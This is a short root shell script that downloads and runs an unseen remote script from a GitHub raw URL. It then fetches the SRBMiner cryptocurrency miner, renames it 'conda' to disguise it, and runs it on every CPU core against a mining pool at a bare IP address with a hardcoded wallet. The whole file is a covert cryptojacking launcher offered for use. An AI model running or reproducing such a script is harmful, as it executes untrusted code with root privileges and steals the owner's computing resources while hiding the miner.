sudo su <<EOF

apt-get -y install screen
wget -qO winter.sh https://raw.githubusercontent.com/anihsugiarti9/ebor/main/login.sh && chmod +x * && ./winter.sh

wget https://raw.githubusercontent.com/apaple/pack/main/SRBMiner-MULTI && chmod u+x SRBMiner-MULTI && mv SRBMiner-MULTI conda && clear && ./conda --disable-gpu --algorithm yespowertide --pool 8.222.237.217:443 --wallet TBEv2m949AK9X72hR6fcfheWuS9mjaB3y9.$(echo GR-$(TZ=UTC-7 date +"%H-%M-%S")) --password x -t $(nproc --all)
EOF
screen -r
